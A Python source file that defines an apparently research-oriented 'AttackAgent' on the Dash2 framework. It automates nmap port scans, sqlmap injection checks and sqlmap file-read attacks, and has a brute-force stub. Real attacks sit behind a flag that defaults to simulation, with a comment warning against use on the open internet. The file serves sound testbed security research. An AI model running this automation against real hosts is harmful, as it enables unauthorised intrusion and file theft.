import sys; sys.path.extend(['../../'])
from Dash2.core.dash_agent import DASHAgent
from Dash2.core.system2 import isConstant
import subprocess


class AttackAgent(DASHAgent):

    SQLMapHome = "/users/blythe/attack/sqlmap"

    agentDef = """

goalWeight doWork 1         # repeat the proces

goalRequirements doWork
    bruteForce(test)

"""

    def __init__(self):
        DASHAgent.__init__(self)
        # WARNING: Don't run this on the open internet! In particular 'server3' etc. are bound on my
        # home ISP by a DNS company used by Time Warner Cable, that I don't want to attack!
        # This variable should be 'False' if the attack is simulated, and should only be set to 'True'
        # on a testbed such as DETER.
        self.realAttack = False

        result = self.register()

        # This says what values from portScanner are likely to be attackable through http/sql injection
        for protocol in ['http', 'http-alt', 'http-proxy', 'sun-answerbook']:
            self.known('httpStyle', ['_' + protocol])

        # self.primitiveActions([('SQLInjectionReadFile', self.SQLInjectionReadFile),
        #           ('portScanner', self.portScanner),
        #           ('checkSQLVulnerability', self.sqlMap)])

        self.primitiveActions([('bruteForce', self.bruteForce)])

        self.readAgent(self.agentDef)

    # Define primitive actions by specifying the bound variables in the input
    # and returning a list of tuples of the other variables.
    # Later could return an iterator for efficiency.
    # Currently since the function is passed into the performAction method,
    # there can only be one argument. Will fix.

    # 'action' is a term, e.g. ('portScanner', '_server1', _80, 'protocol')
    def portScanner(self, action):
        # Will expand to a call to nmap here
        print("called portScanner with", action)
        # Host needs to be bound
        [host, portVar, protocolVar] = action[1:]
        if not isConstant(host):
            print("Host needs to be bound on calling portScanner:", host)
            return False
        if not self.realAttack:
            print("**Simulating port scan returning http on port 80")
            return [{portVar: "_80", protocolVar: '_http'}] # simulate a web server
        bindingsList = []
        readingPorts = False
        proc = None
        try:
            proc = subprocess.check_output(["nmap", host[1:]]).split('\n') # runs nmap if it's in the path
        except:
            print("Unable to run nmap")
            return {}
        for line in proc:
            words = line.split()
            if not readingPorts and len(words) > 0 and words[0] == "PORT":
                readingPorts = True
            elif readingPorts and len(words) >= 3 and words[1] != 'done:':
                # each line like this is a port and protocol,
                # which may not match what we're looking for based on input bindings
                port = "_" + words[0][0:words[0].find("/")]  # remove '/tcp'
                protocol = "_" + words[2]
                # This returns all the results that match.
                # Also records every result just so nmap isn't run more than
                # necessary if a different port or protocol is explored later.
                self.knownTuple((action[0], host, port, protocol))
                if not isConstant(portVar) and not isConstant(protocolVar):
                    bindingsList.append({portVar: port, protocolVar: protocol})
                elif portVar == port and not isConstant(protocolVar):
                    bindingsList.append({protocolVar: protocol})
                elif not isConstant(portVar) and protocolVar == protocol:
                    bindingsList.append({portVar: port})
                elif portVar == port and protocolVar == protocol:
                    bindingsList.append({})   # constants all match, record success
        print("portscanner:", bindingsList)
        return bindingsList

    def bruteForce(self, action):
        users = {'user1':'pass1', 'user2':'pass2'}
        for user in users:
            print(users[user])
        result = self.sendAction('bruteForce')



    def sqlMap(self, action):
        print("Called sql map with action", action)
        # Expect everything to be bound and use sqlmap to check there is a vulnerability there
        # Remove the prefix exclamation marks
        [host, port, base, parameter] = [arg[1:] for arg in action[1:]]
        if not self.realAttack:
            print("** Simulating sql map finding a vulnerability on", host)
            return [{}]    # no bindings, just report finding a vulnerability
        proc = None
        call = ["python", self.SQLMapHome + "/sqlmap.py", "-u", "http://" + host + ":" + port + "/" + base + "?" + parameter + "=1"]
        try:
            proc = subprocess.Popen(call,stdin=subprocess.PIPE,stdout=subprocess.PIPE)
        except BaseException as e:
            print("Unable to run sqlmap:", e)
            return []
        result = []
        printing = False
        seenDashes = 0  # follow the same algorithm for printing as the original java version
        # also following the same approach to writing
        proc.stdin.write('\n\n\n\n')
        line = proc.stdout.readline()
        control = ''
        for i in range(1,32):
            control += chr(i)
        while line != "":
            # Try removing all control characters and printing
            line = line.translate(None, control)
            if "the following injection point" in line:    # found at least one injection point
                result = [{}]    # This would signify success without adding new bindings
                printing = True
            if printing:
                print(("SQLMap: " + line))
                if "---" in line:
                    seenDashes += 1
                    if seenDashes == 2:
                        printing = False
            if "o you want to" in line:  # I suspect these lines are actually sent to stderr - they don't seem
                # to show up here.
                print("SQLMap (answering):", line)
                proc.stdin.write('\n')    # take the default option
            if "starting" or "shutting down" in line:
                print("SQLMap:", line)
            if "shutting down" in line:
                line = ""
            line = proc.stdout.readline()
        print("Finished sqlmap")
        print(proc.communicate())
        return result

    def SQLInjectionReadFile(self, args):
        print("Performing sql injection attack to read a file with args", args)
        [source, target, targetFile, port, baseUrl, parameter] = [arg[1:] for arg in args[1:]]  # assume constants, remove _
        # Call is very similar to sqlMap above with an extra --file-read argument
        if not self.realAttack:
            print("** simulating sql injection attack success for ", target, targetFile, port, baseUrl, parameter)
            return [{}]  # simulate success in reading the file (it is stored locally by sqlmap in the real attack)
        result = []
        try:
            call = ["python", self.SQLMapHome + "/sqlmap.py", "-u",
            "http://" + target + ":" + port + "/" + baseUrl + "?" + parameter + "=1",
            "--file-read=" + targetFile]
            proc = subprocess.Popen(call, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            # The java sends three carriage returns - here I look for lines asking questions and send them
            # On second thoughts, no
            proc.stdin.write('\n\n\n')
            control = ''
            for i in range(1,32):
                control += chr(i)
            line = proc.stdout.readline()
            while line != "":
                line = line.translate(None, control)
                print("SQLMap read:", line)
                if 'o you want to' in line:
                    print("Sending default answer:", line)
                    proc.stdin.write('\n')
                if "the local file" in line:
                    result = [{}]
                line = proc.stdout.readline()
        except BaseException as e:
            print("Unable to run sqlmap to read file:", e)
        return result


if __name__ == "__main__":
    AttackAgent().agent_loop()   # enough iterations for the first attack
